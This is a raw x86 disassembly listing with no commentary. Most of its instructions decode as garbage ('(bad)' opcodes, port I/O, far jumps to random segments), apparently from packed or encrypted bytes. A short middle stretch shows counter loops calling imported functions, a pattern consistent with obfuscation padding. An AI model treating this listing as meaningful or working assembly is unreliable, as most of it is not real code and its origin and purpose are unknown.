  418dd5:	mov    ah,0x53
  418dd7:	mov    al,ds:0x32d1eab6
  418ddc:	mov    bh,0xd6
  418dde:	loop   0x418df0
  418de0:	pavgw  mm6,QWORD PTR ds:0x303b54e
  418de7:	pop    esi
  418de8:	loop   0x418db3
  418dea:	retf   
  418deb:	sbb    ah,BYTE PTR [esi]
  418ded:	xchg   DWORD PTR [edx],edi
  418def:	mov    BYTE PTR [esi+0x57d38d02],dh
  418df5:	jno    0x418dc0
  418df7:	hlt    
  418df8:	push   cs
  418df9:	mov    al,ds:0x3ebe6d07
  418dfe:	xor    ah,ch
  418e00:	mov    al,0xdf
  418e02:	and    al,0xda
  418e04:	stos   DWORD PTR es:[edi],eax
  418e05:	inc    ecx
  418e06:	sti    
  418e07:	mov    ebp,0xcbd1a0b9
  418e0c:	imul   ebp,DWORD PTR [ebx+edx*1-0x71d9de54],0x62d233c5
  418e17:	push   ecx
  418e18:	push   ss
  418e19:	xor    esi,esp
  418e1b:	call   0xb9bfc9a0
  418e20:	dec    esi
  418e21:	lods   al,BYTE PTR ds:[esi]
  418e22:	rcr    ebp,cl
  418e24:	aam    0xf7
  418e26:	int    0xf3
  418e28:	test   eax,0xa5e7cdee
  418e2d:	fild   QWORD PTR [edi-0x6c]
  418e30:	es in  al,0xbc
  418e33:	cs mov al,0xb7
  418e36:	outs   dx,DWORD PTR ds:[esi]
  418e37:	add    eax,0xf1627bbf
  418e3c:	or     dh,cl
  418e3e:	lock data16 add al,0x93
  418e42:	jnp    0x418e0b
  418e44:	xor    al,0xff
  418e46:	loopne 0x418ead
  418e48:	loopne 0x418e72
  418e4a:	sub    bl,cl
  418e4c:	xor    BYTE PTR [edi+0x7d],cl
  418e4f:	mov    ds:0xd5f8a428,al
  418e54:	nop
  418e55:	dec    esp
  418e56:	sub    DWORD PTR [ebx],0x3d
  418e59:	(bad)  
  418e5a:	push   eax
  418e5b:	out    0xb1,al
  418e5d:	or     DWORD PTR [esi+0x38a9bc7b],0xffffff9f
  418e64:	or     eax,0x24d3e036
  418e69:	push   ds
  418e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e6b:	push   DWORD PTR [eax]
  418e6d:	mov    eax,DWORD PTR [ebp+0x10]
  418e70:	jmp    0x41918a
  418e75:	retf   
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	add    bh,BYTE PTR [eax-0x3ff2e255]
  418e87:	jg     0x418f01
  418e89:	jnp    0x418f09
  418e8b:	js     0x418f05
  418e8d:	aaa    
  418e8e:	sub    al,0x90
  418e90:	mov    ?,WORD PTR [esi+ecx*1-0x530b3d12]
  418e97:	call   0xaa32abc
  418e9c:	xchg   edx,eax
  418e9d:	lods   al,BYTE PTR ds:[esi]
  418e9e:	and    al,0xc5
  418ea0:	imul   esp,DWORD PTR [edi+0x31],0x39
  418ea4:	popa   
  418ea5:	xor    bh,bh
  418ea7:	mov    eax,ds:0x54af677a
  418eac:	pop    es
  418ead:	jmp    0x6458:0x75b16de
  418eb4:	mov    ebx,0xb9e70b59
  418eb9:	add    eax,0xa60e57fc
  418ebe:	lods   eax,DWORD PTR ds:[esi]
  418ebf:	cmp    edi,DWORD PTR [ebx]
  418ec1:	icebp  
  418ec2:	inc    esi
  418ec3:	or     bh,BYTE PTR [edi+0x7173263d]
  418ec9:	jmp    0xf80c:0x5e90e9ce
  418ed0:	pop    es
  418ed1:	xchg   esp,eax
  418ed2:	outs   dx,BYTE PTR ds:[esi]
  418ed3:	xchg   ebx,eax
  418ed4:	test   eax,0xdfcda50c
  418ed9:	xchg   esi,eax
  418eda:	scas   al,BYTE PTR es:[edi]
  418edb:	mov    BYTE PTR [esp+edi*1-0xf30924d],0xdf
  418ee3:	cld    
  418ee4:	push   ds
  418ee5:	push   ebx
  418ee6:	hlt    
  418ee7:	in     eax,0x5a
  418ee9:	dec    esp
  418eea:	mov    eax,ds:0x3e5e96ba
  418eef:	xchg   ecx,eax
  418ef0:	fwait
  418ef1:	outs   dx,DWORD PTR ds:[esi]
  418ef2:	out    dx,eax
  418ef3:	js     0x418f42
  418ef5:	scas   eax,DWORD PTR es:[edi]
  418ef6:	cmp    DWORD PTR [ecx+0x3e],eax
  418ef9:	or     DWORD PTR [edx+0x73792b83],0x72
  418f00:	push   esp
  418f01:	stos   BYTE PTR es:[edi],al
  418f02:	mov    esi,0xd6e5ac70
  418f07:	or     eax,0xacd4ad26
  418f0c:	jae    0x418edf
  418f0e:	pop    esi
  418f0f:	aam    0x88
  418f11:	xchg   edx,eax
  418f12:	pop    eax
  418f13:	pop    es
  418f14:	mov    dl,0x48
  418f16:	mov    eax,ds:0xc558a11f
  418f1b:	jg     0x418ef8
  418f1d:	je     0x418edd
  418f1f:	fisub  WORD PTR [edx]
  418f21:	and    dh,dl
  418f23:	sub    eax,0x6a45484
  418f28:	mov    al,BYTE PTR [eax+0x5660b21d]
  418f2e:	ins    DWORD PTR es:[edi],dx
  418f2f:	mov    fs,WORD PTR [edx+0x32c9f18d]
  418f35:	pusha  
  418f36:	sub    esi,eax
  418f38:	cmp    dh,BYTE PTR [edi]
  418f3a:	inc    ecx
  418f3b:	sbb    esi,DWORD PTR [edx-0x2a]
  418f3e:	idiv   DWORD PTR [ecx+0x31e52a32]
  418f44:	mov    eax,ds:0xed13e04e
  418f49:	std    
  418f4a:	add    edi,DWORD PTR [ebp+0x7352c045]
  418f50:	arpl   WORD PTR [ecx+0x3c],cx
  418f53:	jae    0x418f96
  418f55:	es bswap ecx
  418f58:	add    al,0x3f
  418f5a:	adc    DWORD PTR [edi+0x5b],edx
  418f5d:	push   cs
  418f5e:	pop    esp
  418f5f:	sar    BYTE PTR [edi+esi*8-0x1725d313],0xa0
  418f67:	push   edi
  418f68:	lds    esi,FWORD PTR [ebp+eax*2-0x2edb9791]
  418f6f:	push   edi
  418f70:	fcomp  QWORD PTR [esi+0x626ed078]
  418f76:	dec    eax
  418f77:	jmp    0x418f55
  418f79:	in     al,dx
  418f7a:	lea    edx,[esi+0x44]
  418f7d:	hlt    
  418f7e:	sub    BYTE PTR [edi],ah
  418f80:	ror    edi,cl
  418f82:	lds    eax,FWORD PTR ss:0x32935f41
  418f89:	shl    DWORD PTR [edi+0x51],cl
  418f8c:	adc    eax,0xb676d407
  418f91:	nop
  418f92:	sbb    al,al
  418f94:	fisub  WORD PTR [edx]
  418f96:	sub    BYTE PTR ds:0x55065d2b,dl
  418f9c:	lock cwde 
  418f9e:	adc    al,0x92
  418fa0:	popa   
  418fa1:	adc    DWORD PTR ds:0x91c7a1d1,esi
  418fa7:	jns    0x418f86
  418fa9:	xchg   edi,eax
  418faa:	inc    edx
  418fab:	imul   ebx,DWORD PTR [edi],0xa3e02f6c
  418fb1:	mov    ss,eax
  418fb3:	mov    ds:0x92620d59,al
  418fb8:	test   al,0xd4
  418fba:	mov    DWORD PTR [ecx-0x45],eax
  418fbd:	fadd   st(7),st
  418fbf:	mov    ebx,0x4a62bd69
  418fc4:	retf   0xa87a
  418fc7:	and    DWORD PTR [esi-0x4d75e54],ebp
  418fcd:	(bad)  
  418fce:	in     al,dx
  418fcf:	xor    eax,0x29134322
  418fd4:	out    0xc5,al
  418fd6:	(bad)  
  418fd7:	jnp    0x419002
  418fd9:	inc    ecx
  418fda:	sbb    ch,BYTE PTR gs:[ebx+esi*4-0x6ed3dfc2]
  418fe2:	xor    BYTE PTR [ebx],ah
  418fe4:	jle    0x418f9a
  418fe6:	adc    eax,0xe3250bdf
  418feb:	inc    eax
  418fec:	call   ebx
  418fee:	xchg   esp,eax
  418fef:	outs   dx,DWORD PTR ds:[esi]
  418ff0:	daa    
  418ff1:	xchg   esp,eax
  418ff2:	pop    ss
  418ff3:	or     ebp,DWORD PTR [ebx+ebp*8-0x4333ea4f]
  418ffa:	or     DWORD PTR [edx-0x5bbec91b],ecx
  419000:	jo     0x419061
  419002:	rcr    BYTE PTR [esi-0x45],1
  419005:	je     0x418fa6
  419007:	pop    esp
  419008:	lods   eax,DWORD PTR ds:[esi]
  419009:	xchg   DWORD PTR [ebx+0x2d],eax
  41900c:	add    dh,dl
  41900e:	mov    eax,0xf7c9f4f8
  419013:	sbb    BYTE PTR ds:0x4a567833,0x9
  41901a:	xchg   ecx,eax
  41901b:	push   es
  41901c:	daa    
  41901d:	xor    esp,eax
  41901f:	and    BYTE PTR [edx-0x4963e5f2],dl
  419025:	xchg   BYTE PTR [edx+0x7],bh
  419028:	mov    dl,0x85
  41902a:	fwait
  41902b:	imul   edi
  41902d:	and    edx,ebx
  41902f:	scas   eax,DWORD PTR es:[edi]
  419030:	jmp    0xad9e8ea1
  419035:	mov    ds:0x15fca74f,al
  41903a:	pop    ebx
  41903b:	loop   0x419057
  41903d:	out    dx,eax
  41903e:	fs add eax,0x98fec0b1
  419044:	and    BYTE PTR fs:[eax],al
  419047:	adc    eax,0xcf2bb8b6
  41904c:	inc    ecx
  41904d:	mov    edi,0xa9b89078
  419052:	mov    cl,BYTE PTR [eax+ecx*4+0x884f71b]
  419059:	in     al,0xe9
  41905b:	push   edi
  41905c:	inc    edi
  41905d:	lods   al,BYTE PTR ds:[esi]
  41905e:	mov    al,ds:0xf96f3188
  419063:	mov    eax,0x7e0dad3c
  419068:	pop    ebp
  419069:	clc    
  41906a:	push   edx
  41906b:	sub    esi,0x64
  41906e:	lea    ebx,[edx+0x2c]
  419071:	mov    eax,ds:0xbefc8416
  419076:	adc    BYTE PTR [ecx+ecx*2-0x258f1905],bh
  41907d:	xor    esi,DWORD PTR [ebp+0x489e0fa9]
  419083:	test   eax,0xa208ce48
  419088:	dec    DWORD PTR [ebp-0x5e58764a]
  41908e:	(bad)  
  41908f:	jmp    0x60641740
  419094:	jo     0x419052
  419096:	push   es
  419097:	mov    al,BYTE PTR [ebx]
  419099:	lods   eax,DWORD PTR ds:[esi]
  41909a:	retf   
  41909b:	mov    al,ds:0xfba51475
  4190a0:	fnsave [edx]
  4190a2:	sub    eax,0xa7586638
  4190a7:	loopne 0x419067
  4190a9:	inc    ebx
  4190aa:	sbb    al,0x70
  4190ac:	pop    ss
  4190ad:	sar    BYTE PTR [ecx+0x540fde79],0x87
  4190b4:	leave  
  4190b5:	rcl    DWORD PTR [eax-0x5c],1
  4190b8:	inc    ebp
  4190b9:	or     dh,BYTE PTR [eax-0x212131e2]
  4190bf:	(bad)  
  4190c0:	cmc    
  4190c1:	das    
  4190c2:	js     0x41908b
  4190c4:	es int3 
  4190c6:	xor    edi,DWORD PTR [ebx+0x604972b4]
  4190cc:	jbe    0x419122
  4190ce:	jge    0x419117
  4190d0:	sub    ah,0x31
  4190d3:	sti    
  4190d4:	adc    ebp,DWORD PTR [eax+0x5b721ac8]
  4190da:	dec    ebx
  4190db:	daa    
  4190dc:	add    ebp,DWORD PTR [ebp+eax*2+0x2b]
  4190e0:	std    
  4190e1:	sbb    eax,0x8ebd2ae1
  4190e6:	std    
  4190e7:	ins    DWORD PTR es:[edi],dx
  4190e8:	and    BYTE PTR [ebx+0x1e78678d],dl
  4190ee:	sub    ecx,esp
  4190f0:	sbb    al,0x5a
  4190f2:	pop    ebx
  4190f3:	jae    0x419091
  4190f5:	idiv   DWORD PTR [ecx+0x2d]
  4190f8:	aam    0x8b
  4190fa:	cdq    
  4190fb:	les    ebx,FWORD PTR [edi+0x21]
  4190fe:	neg    BYTE PTR [ecx+0x61784ff5]
  419104:	sbb    al,0x5b
  419106:	jecxz  0x419096
  419108:	test   al,0x9a
  41910a:	adc    eax,0xb6fdf72
  41910f:	out    dx,al
  419110:	fimul  WORD PTR [esi-0xcf8e3fa]
  419116:	sbb    edi,esp
  419118:	jae    0x4190f7
  41911a:	fistp  QWORD PTR [ebx]
  41911c:	cmp    DWORD PTR [ecx],0xa
  41911f:	sbb    BYTE PTR [ebp+0x5],bh
  419122:	loop   0x419184
  419124:	ds (bad) 
  419126:	cli    
  419127:	jae    0x419151
  419129:	lock loop 0x4190d2
  41912c:	daa    
  41912d:	pop    di
  41912f:	(bad)  
  419130:	test   eax,0xff57fdf0
  419135:	dec    BYTE PTR [eax+0x60]
  419138:	add    bh,BYTE PTR ds:[edx-0x30]
  41913c:	mov    dh,0x60
  41913e:	idiv   DWORD PTR [edi-0x75791e67]
  419144:	mov    ebp,0xea1ddf84
  419149:	jo     0x4191c3
  41914b:	and    cl,BYTE PTR [edi-0x22]
  41914e:	into   
  41914f:	lea    edx,[ebp+0x2]
  419152:	idiv   BYTE PTR [ebp-0x74ca1075]
  419158:	or     eax,0x3c235671
  41915d:	nop
  41915e:	rcr    DWORD PTR [eax],cl
  419160:	jnp    0x419186
  419162:	icebp  
  419163:	jbe    0x41915f
  419165:	and    eax,DWORD PTR [edi]
  419167:	aam    0x3c
  419169:	pop    esi
  41916a:	and    al,0xf8
  41916c:	adc    ebx,ebx
  41916e:	cli    
  41916f:	mov    eax,ds:0xf9f1e203
  419174:	and    DWORD PTR [ecx-0x2708a88b],eax
  41917a:	imul   edx,DWORD PTR [ebp+eiz*2-0x3d],0xb23d4681
  419182:	mov    cl,BYTE PTR [esi]
  419184:	pop    eax
  419185:	mov    edi,0x78c591c3
  41918a:	call   eax
  41918c:	jmp    0x419194
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    ds,WORD PTR [edi+0x8df6538]
  4191b4:	lds    edi,FWORD PTR [edi+0x78]
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x41913c
  4191bc:	xor    eax,0xf79a5be0
  4191c1:	mov    ds:0xce4811b8,eax
  4191c6:	outs   dx,BYTE PTR ds:[esi]
  4191c7:	xlat   BYTE PTR ds:[ebx]
  4191c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191c9:	sbb    ah,BYTE PTR [edi-0x7b58789e]
  4191cf:	mov    al,0x82
  4191d1:	sub    ch,BYTE PTR [eax]
  4191d3:	cwde   
  4191d4:	mov    WORD PTR [esi-0x4c],?
  4191d7:	je     0x4191ad
  4191d9:	xor    ecx,DWORD PTR [ebx+0x1c]
  4191dc:	pop    ecx
  4191dd:	aam    0x3
  4191df:	neg    BYTE PTR [esi]
  4191e1:	or     eax,0xa7f7f61
  4191e6:	ret    
  4191e7:	pop    eax
  4191e8:	or     eax,0x43e9753d
  4191ed:	lahf   
  4191ee:	pop    ds
  4191ef:	cmp    al,BYTE PTR [edx-0x4677e70f]
  4191f5:	popf   
  4191f6:	sahf   
  4191f7:	cmp    BYTE PTR [eax+0x64],cl
  4191fa:	imul   esi,ecx,0xffffffdc
  4191fd:	jecxz  0x41925c
  4191ff:	call   DWORD PTR [eax]
  419201:	push   esp
  419202:	call   0x1e5f:0xac15747b
  419209:	test   al,0xac
  41920b:	sbb    BYTE PTR [ebp-0x2f],ah
  41920e:	xchg   BYTE PTR [edi+0x77725a3c],al
  419214:	clc    
  419215:	cmp    al,0x7a
  419217:	dec    esi
  419218:	in     al,dx
  419219:	jmp    0x41926a
  41921b:	add    ebp,eax
  41921d:	jae    0x4191fa
  41921f:	jno    0x4191b5
  419221:	dec    edi
  419222:	repnz or edx,ebp
  419225:	mov    eax,0xb3258fc8
  41922a:	sbb    al,0x38
  41922c:	mov    esi,0x9184b7d8
  419231:	sub    al,0x12
  419233:	imul   edi,DWORD PTR [edx*8+0x1d6201bd],0x68
  41923b:	lahf   
  41923c:	push   edi
  41923d:	test   DWORD PTR [edx-0x2fd68472],edi
  419243:	jno    0x419255
  419245:	xchg   ebp,eax
  419246:	imul   DWORD PTR [edi+0x3d]
  419249:	rcr    bl,cl
  41924b:	aam    0x54
  41924d:	outs   dx,DWORD PTR ds:[esi]
  41924e:	push   eax
  41924f:	mov    ch,0x6a
  419251:	sub    esi,DWORD PTR [edx+0x30]
  419254:	and    ebp,esp
  419256:	cdq    
  419257:	sahf   
  419258:	jne    0x419275
  41925a:	jecxz  0x41920a
  41925c:	shl    DWORD PTR [edi-0x61491157],cl
  419262:	mov    ebx,0x6e2ff86
  419267:	cmp    cl,al
  419269:	cmp    BYTE PTR [ebx],dl
  41926b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41926c:	sub    ch,al
  41926e:	add    DWORD PTR [edx-0x7c],ecx
  419271:	mov    ebx,0xa523eeed
  419276:	movsx  esp,WORD PTR [ecx+0x65]
  41927a:	rol    BYTE PTR [ebx-0x5c],0x84
  41927e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41927f:	or     eax,0x763f4b2d
  419284:	mov    ds:0x1e73673f,al
  419289:	mov    DWORD PTR [edx+0x350e0ba2],ebp
  41928f:	or     ah,BYTE PTR [edi]
  419291:	sub    BYTE PTR [esi],dl
  419293:	jno    0x419265
  419295:	xor    esi,DWORD PTR [ebp+0x5e26f420]
  41929b:	mov    cl,0xc4
  41929d:	icebp  
  41929e:	lock data16 imul BYTE PTR [ebx-0x48]
  4192a3:	scas   al,BYTE PTR es:[edi]
  4192a4:	loop   0x4192a7
  4192a6:	pop    ss
  4192a7:	retf   0xc64
  4192aa:	sub    ebx,DWORD PTR [esi+0x683a5d88]
  4192b0:	fsubr  DWORD PTR [ebx-0x7a453eb5]
  4192b6:	sbb    BYTE PTR [eax],ah
  4192b8:	int    0xdf
  4192ba:	mov    BYTE PTR [eax+0x5c],ch
  4192bd:	sub    al,0xa1
  4192bf:	cdq    
  4192c0:	push   ebp
  4192c1:	popa   
  4192c2:	push   ebx
  4192c3:	(bad)  [ebx+eiz*4]
  4192c6:	xlat   BYTE PTR ds:[ebx]
  4192c7:	jg     0x4192e0
  4192c9:	cld    
  4192ca:	mov    dh,0xf5
  4192cc:	imul   BYTE PTR [edx]
  4192ce:	or     ecx,DWORD PTR [esi-0x4bb92875]
  4192d4:	add    ch,bl
  4192d6:	add    DWORD PTR [ebp+0x37],0xffffffa8
  4192da:	xor    al,0x92
  4192dc:	nop
  4192dd:	push   ss
  4192de:	mov    eax,0xe4ab9d16
  4192e3:	sub    bh,BYTE PTR [ecx-0x6c]
  4192e6:	xchg   edi,eax
  4192e7:	jl     0x4192c7
  4192e9:	adc    DWORD PTR [edx-0x204c359b],esp
  4192ef:	push   eax
  4192f0:	(bad)  
  4192f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f2:	or     ebx,DWORD PTR [edx+0x12]
  4192f5:	and    DWORD PTR [edx-0x23],esp
  4192f8:	mov    BYTE PTR [ecx+0x8c47540],bh
  4192fe:	call   0x4282:0x8cf4f79b
  419305:	fcomp  st(4)
  419307:	sbb    DWORD PTR [edx+0x517a68d2],ecx
  41930d:	mov    esp,0xf4ea70e2
  419312:	fs stos DWORD PTR es:[edi],eax
  419314:	jb     0x419367
  419316:	pop    esi
  419317:	rcr    DWORD PTR [esi-0x687b59b0],0xf8
  41931e:	div    DWORD PTR [eax]
  419320:	(bad)  
  419322:	inc    ebp
  419323:	cmp    esp,esi
  419325:	xchg   ebx,eax
  419326:	push   esp
  419327:	cmp    DWORD PTR [edi],ecx
  419329:	(bad)  
  41932a:	mov    dh,0x8c
  41932c:	icebp  
  41932d:	jb     0x4193a8
  41932f:	adc    BYTE PTR [edx],dh
  419331:	sti    
  419332:	arpl   WORD PTR [ecx],bp
  419334:	outs   dx,BYTE PTR ds:[esi]
  419335:	inc    eax
  419336:	int3   
  419337:	xchg   DWORD PTR [ecx+0x3283c9bc],esp
  41933d:	mov    edx,0xa1b9fd2d
  419342:	jae    0x4192ea
  419344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419345:	(bad)  
  419346:	cmp    eax,0x9f4cad07
  41934b:	aad    0x60
  41934d:	stos   DWORD PTR es:[edi],eax
  41934e:	(bad)  
  41934f:	jle    0x419306
  419351:	shr    BYTE PTR [ecx+ecx*2-0x2b566c93],0xe7
  419359:	in     al,dx
  41935a:	popf   
  41935b:	cld    
  41935c:	jns    0x419330
  41935e:	stos   BYTE PTR es:[edi],al
  41935f:	sbb    bh,BYTE PTR [edx+0x7c]
  419362:	in     al,dx
  419363:	push   ds
  419364:	adc    bh,BYTE PTR [ecx+0x22]
  419367:	or     BYTE PTR [esi],bh
  419369:	es ret 0xcf1b
  41936d:	push   edi
  41936e:	int3   
  41936f:	xchg   ebx,eax
  419370:	dec    edx
  419371:	out    dx,eax
  419372:	mov    al,ds:0xfdd41fc6
  419377:	mov    al,0xbf
  419379:	mov    BYTE PTR [eax-0x3f719ca0],dl
  41937f:	test   DWORD PTR [esi+ecx*2],esi
  419382:	daa    
  419383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419384:	mov    edi,0x59b22939
  419389:	pushf  
  41938a:	das    
  41938b:	std    
  41938c:	cwde   
  41938d:	or     bl,BYTE PTR [ecx]
  41938f:	cs dec ecx
  419391:	stc    
  419392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419393:	in     al,dx
  419394:	in     eax,dx
  419395:	sbb    ebx,DWORD PTR [ecx+0x1]
  419398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419399:	jp     0x419415
  41939b:	dec    edx
  41939c:	cdq    
  41939d:	fld    QWORD PTR [esi-0x643d3f61]
  4193a3:	xchg   edx,eax
  4193a4:	ins    BYTE PTR es:[edi],dx
  4193a5:	loope  0x4193b3
  4193a7:	fs mov ebp,0xbb9dc52d
  4193ad:	fldlg2 
  4193af:	(bad)  
  4193b0:	imul   eax,DWORD PTR [ecx-0x5574d5c4],0x21e11861
  4193ba:	out    0xa8,al
  4193bc:	sub    dl,BYTE PTR [ebx+0x29]
  4193bf:	sub    DWORD PTR [ebx-0x3f],esp
  4193c2:	hlt    
  4193c3:	xor    ebx,DWORD PTR [edi+0x50]
  4193c6:	xor    DWORD PTR [edx+0xd],esi
  4193c9:	test   eax,0x1659fc59
  4193ce:	and    BYTE PTR [ecx+ecx*4+0x45c7b88f],ah
  4193d5:	cld    
  4193d6:	cmp    BYTE PTR [ebp+0x2581f89c],al
  4193dc:	jge    0x419386
  4193de:	inc    edx
  4193df:	add    BYTE PTR [eax],al
  4193e1:	add    BYTE PTR [eax],al
  4193e3:	add    BYTE PTR [ebx],dh
  4193e5:	leave  
  4193e6:	add    ecx,DWORD PTR ds:0x42a87d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a87d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a87d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a87d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a801,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a801
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a801,ecx
  419434:	cmp    DWORD PTR ds:0x42a801,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a801,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a98f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7b1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a80d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a80d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a80d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a80d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa48
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a80d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a805
  4194bb:	and    DWORD PTR ds:0x42a775,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a76d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a779
  4194d8:	adc    DWORD PTR ds:0x42a871,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a761,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a87d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a7f5,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a839,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi-0x70],eax
  41952b:	stos   BYTE PTR es:[edi],al
  41952c:	cmp    al,0xb1
  41952e:	and    bl,cl
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x41953b
  419537:	in     eax,dx
  419538:	jmp    0xb591:0xfcd598d7
  41953f:	pop    ebp
  419540:	and    eax,0xe9e5700b
  419545:	push   ecx
  419546:	bound  edx,QWORD PTR [edx*8-0x749dc985]
  41954d:	or     eax,0x35ed9e16
  419552:	aas    
  419553:	inc    ecx
  419554:	inc    edx
  419555:	add    eax,0xefb53e9b
  41955a:	leave  
  41955b:	pop    ss
  41955c:	sub    al,0x75
  41955e:	or     eax,DWORD PTR [eax+ebp*1+0x2c]
  419562:	enter  0x50b3,0xb0
  419566:	pop    es
  419567:	cdq    
  419568:	inc    esp
  419569:	or     BYTE PTR [esi],al
  41956b:	mov    eax,ds:0x15118357
  419570:	cmp    ah,BYTE PTR [edi-0x3f]
  419573:	ins    BYTE PTR es:[edi],dx
  419574:	pop    ss
  419575:	out    0x3,al
  419577:	ins    BYTE PTR es:[edi],dx
  419578:	cli    
  419579:	aad    0x5c
  41957b:	out    0xa9,eax
  41957d:	jnp    0x419575
  41957f:	and    edx,edi
  419581:	sar    BYTE PTR [edi+0x25c2acd3],1
  419587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419588:	pop    eax
  419589:	es int3 
  41958b:	hlt    
  41958c:	lds    eax,FWORD PTR [edx+0x45]
  41958f:	push   edx
  419590:	adc    BYTE PTR [esi-0x72],cl
  419593:	fs mov edx,0x5e3dbffc
  419599:	pop    ds
  41959a:	xor    esp,ebp
  41959c:	pop    ss
  41959d:	xor    al,dh
  41959f:	dec    ebx
  4195a0:	fist   DWORD PTR [edi+edi*1]
  4195a3:	shl    BYTE PTR [edx-0x2a427674],0x8c
  4195aa:	not    cl
  4195ac:	xchg   edx,eax
  4195ad:	sahf   
  4195ae:	ins    DWORD PTR es:[edi],dx
  4195af:	sub    BYTE PTR [edi],bh
  4195b1:	push   esi
  4195b2:	xor    BYTE PTR [ebx],0x33
  4195b5:	icebp  
  4195b6:	jno    0x41955a
  4195b8:	push   ecx
  4195b9:	imul   ebx,DWORD PTR [ecx],0xfffffff2
  4195bc:	mov    ah,0x0
  4195be:	fiadd  DWORD PTR ds:0x88e6ee91
  4195c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195c5:	out    dx,eax
  4195c6:	scas   al,BYTE PTR es:[edi]
  4195c7:	inc    ah
  4195c9:	sbb    DWORD PTR [ebp-0x4a484fea],edx
  4195cf:	or     DWORD PTR [ecx+0xd],ebp
  4195d2:	add    al,0xba
  4195d4:	mov    dl,0xe
  4195d6:	xchg   edx,eax
  4195d7:	xor    DWORD PTR fs:[esi+edx*2],0xffffffb4
  4195dc:	sub    dl,bl
  4195de:	out    dx,eax
  4195df:	sub    eax,DWORD PTR [eax]
  4195e1:	popa   
  4195e2:	inc    eax
  4195e3:	lock pop ebx
  4195e5:	adc    bh,BYTE PTR [edx+0x21]
  4195e8:	cld    
  4195e9:	push   es
  4195ea:	data16 xor al,0xdd
  4195ed:	or     eax,0x6d1d3dae
  4195f2:	imul   eax,DWORD PTR [ebx],0xcefc1b4b
  4195f8:	pop    edi
  4195f9:	pop    edi
  4195fa:	or     eax,0x6618515d
  4195ff:	sub    BYTE PTR [di+0x3b],0x26
  419604:	jge    0x419592
  419606:	into   
  419607:	lods   eax,DWORD PTR ds:[esi]
  419608:	dec    ecx
  419609:	dec    ebp
  41960a:	pop    edx
  41960b:	push   esi
  41960c:	ja     0x4195a9
  41960e:	add    al,0xe3
  419610:	fdiv   QWORD PTR [esi]
  419612:	sbb    dl,BYTE PTR [edi+0x46b5e9b]
  419618:	in     eax,0xd6
  41961a:	pop    ds
  41961b:	xor    BYTE PTR [edi+0x7a],bl
  41961e:	shr    BYTE PTR [edi+0x62],cl
  419621:	sub    DWORD PTR [ecx-0x2d908f45],0x3c7d4d9e
  41962b:	pop    edi
  41962c:	daa    
  41962d:	bound  eax,QWORD PTR [eax-0x79c9889c]
  419633:	ret    0xf202
  419636:	xchg   edi,eax
  419637:	(bad)  
  419638:	std    
  419639:	test   BYTE PTR [esi],ch
  41963b:	dec    eax
  41963c:	jo     0x4195f2
